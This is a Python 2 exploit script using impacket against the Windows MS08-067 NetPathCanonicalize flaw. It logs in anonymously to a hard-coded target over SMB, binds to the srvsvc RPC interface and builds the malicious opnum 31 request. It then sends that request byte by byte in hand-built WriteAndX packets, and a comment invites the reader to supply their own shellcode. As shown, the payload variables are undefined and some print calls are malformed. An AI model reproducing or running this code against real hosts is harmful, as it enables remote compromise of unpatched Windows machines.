import unittest
import os
import socket
import select
import errno
import struct
import sys

import ConfigParser
from binascii import unhexlify
from impacket.smbconnection import SMBConnection, smb
from impacket.smb3structs import *
from impacket import nt_errors, nmb
from impacket.dcerpc.v5 import srvs
from impacket.dcerpc.v5 import rpcrt
from impacket import uuid
from impacket.uuid import uuidtup_to_bin, generate, stringver_to_bin, bin_to_uuidtup


target='10.100.3.197' #靶机地址
fname='\\BROWSER'
trans_name = '\\PIPE\\'

con = smb.SMB(target, target, my_name = 'zhangfan', timeout=5) 
con.login('','')
tid = con.tree_connect_andx('\\\\' + target + '\\IPC$')
fid = con.nt_create_andx(tid, fname)
uid = con._uid 
pid = os.getpid() & 0xFFFF
print('get pid: %d\n' % pid)

iface_uuid = '4b324fc8-1670-01d3-1278-5a47bf6ee188'
transfer_syntax = '8a885d04-1ceb-11c9-9fe8-08002b104860'
bind = rpcrt.MSRPCBind()

# The true one :)
item = rpcrt.CtxItem()
item['AbstractSyntax'] = uuidtup_to_bin((iface_uuid,'3.0'))
item['TransferSyntax'] = uuidtup_to_bin((transfer_syntax, '2.0'))
item['ContextID'] = 0 
item['TransItems'] = 1
bind.addCtxItem(item)
print( 'bind item: %d' % bind['ctx_num'])

rpchd = rpcrt.MSRPCHeader()
rpchd['type'] = rpcrt.MSRPC_BIND
rpchd['call_id'] = 0
bind_dt = bind.getData()
rpchd['frag_len'] = rpchd._SIZE + len(bind_dt) 
pipe_dt = rpchd.getData() + bind_dt
con.TransactNamedPipe(tid, fid, pipe_dt)
#resp = con.recvSMB()


#construct payload

def gen_payload_rpc(prefix, path_all):
    maxbuf = 374    
    request = struct.pack('IIII'+str(len(path_all))+'sIIII'+str(len(prefix))+'sII', \
            0, len(path_all)/2, 0, len(path_all)/2, path_all, maxbuf,\
            2, 0, 2, prefix, 1, 1)
    print('len : %d\n', len(request))
    rpccall_body = request
    rpchd_call = rpcrt.MSRPCRequestHeader()
    rpchd_call['call_id'] = 1 #0
    rpchd_call['frag_len'] = rpchd_call._SIZE + len(rpccall_body)
    rpchd_call['op_num'] = 31
    print('length %d\n', rpchd_call['frag_len'])
    print('size %d\n', rpchd_call._SIZE)
    pipe_dt2 = rpchd_call.getData()+rpccall_body
    return pipe_dt2

#prefix:RPC NetPathCanonicalize的prefix字段
#path_all:RPC NetPathCanonicalize的path字段
#如果你能熟练的构造MS08-067的SHELLCODE，可以在此处传入SHELLCODE相关的构造
dt = gen_payload_rpc(prefix, path_all)

def gen_smb_hd(cmd, tid, pid, uid, mid):
    smb_hdr = "\xff\x53\x4d\x42" + cmd + \
    "\x00\x00\x00\x00\x18\x01\x48\x00\x00\x00\x00" + \
    "\x00\x00\x00\x00\x00\x00\x00\x00" +\
    struct.pack("H",tid) + \
    struct.pack("H",pid) + \
    struct.pack('H',uid) + \
    struct.pack('H',mid) 
    return smb_hdr

def write_anx_dt(fid, mid, trans_byte):
    dataoffset = 0
    smb_hd = gen_smb_hd('\x2f', tid, pid, uid, mid)
    data_offset = len(smb_hd) + 1 + 0x0e *2  #len(write_req) 

    write_req = "\x0e" +  \
        '\xff' +\
        '\xff' + \
        '\x00\x20' +\
        struct.pack('H', fid) + \
        struct.pack('I', 0) + \
        struct.pack('I', 0) + \
        struct.pack('H', 0x0008) +\
        struct.pack('H', 0) +\
        struct.pack('H', 0) + \
        struct.pack('H', len(trans_byte)) +\
        struct.pack('H', data_offset) + \
        struct.pack('I', 0) + \
        struct.pack('H', len(trans_byte))


    trans_1seg = smb_hd + write_req + trans_byte
    return trans_1seg 





for ofst in range(0, len(dt)):
    snd_dt = write_anx_dt(fid, ofst, dt[ofst:ofst+1])
    con._sess.send_packet(snd_dt)
    con.recvSMB()
    print ofst





